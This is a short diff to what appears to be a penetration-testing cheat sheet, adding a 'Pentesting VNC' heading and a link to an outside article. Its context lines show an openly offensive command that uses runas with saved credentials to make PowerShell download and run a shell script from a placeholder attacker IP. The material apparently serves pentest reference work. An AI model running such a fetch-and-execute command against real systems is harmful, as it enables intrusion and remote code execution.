@@ -863,3 +863,6 @@ Exploit suggester using particular OS without suggested hotfixes
 runas /user:<DOMAIN>\<USER> /savecred "powershell -c IEX (New-Object Net.Webclient).downloadstring('http://<IP>/shell.ps1')"
 ```
 
+### Pentesting VNC
+
+https://www.hackingarticles.in/vnc-penetration-testing/
